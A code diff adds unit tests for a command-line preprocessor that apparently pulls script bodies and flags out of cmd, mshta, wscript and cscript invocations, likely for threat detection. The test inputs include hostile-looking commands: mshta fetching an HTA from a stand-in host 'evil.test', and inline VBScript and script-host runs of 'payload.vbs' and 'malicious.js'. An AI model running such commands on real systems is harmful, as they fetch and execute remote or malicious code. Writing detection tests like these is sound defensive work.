@@ -60,3 +60,37 @@ describe('preprocess() interpreter field — zero regression on the PS path', ()
     expect(r.interpreter).toBe('unknown')
   })
 })
+
+describe('per-interpreter body/target extraction', () => {
+  it('cmd: extracts the /c body', () => {
+    expect(preprocess('cmd /c whoami').script).toBe('whoami')
+  })
+
+  it('cmd: extracts the /k body, surviving a quoted path prefix', () => {
+    expect(preprocess('"C:\\Windows\\System32\\cmd.exe" /k dir').script).toBe('dir')
+  })
+
+  it('mshta: extracts a URL target', () => {
+    expect(preprocess('mshta http://evil.test/x.hta').script).toBe('http://evil.test/x.hta')
+  })
+
+  it('mshta: extracts an inline vbscript: target', () => {
+    const r = preprocess('mshta vbscript:CreateObject("WScript.Shell").Run("calc.exe")(window.close)')
+    expect(r.script).toContain('CreateObject')
+    expect(r.script.startsWith('vbscript:')).toBe(true)
+  })
+
+  it('wscript: extracts the .vbs target and //E:/,//NoLogo flags', () => {
+    const r = preprocess('wscript //E:vbscript //NoLogo C:\\Users\\Public\\payload.vbs')
+    expect(r.script).toBe('C:\\Users\\Public\\payload.vbs')
+    const flagNames = r.flags.map((f) => f.flag)
+    expect(flagNames).toContain('//E:vbscript')
+    expect(flagNames).toContain('//NoLogo')
+  })
+
+  it('cscript: extracts the .js target and //E:jscript flag', () => {
+    const r = preprocess('cscript //E:jscript malicious.js')
+    expect(r.script).toBe('malicious.js')
+    expect(r.flags.map((f) => f.flag)).toContain('//E:jscript')
+  })
+})
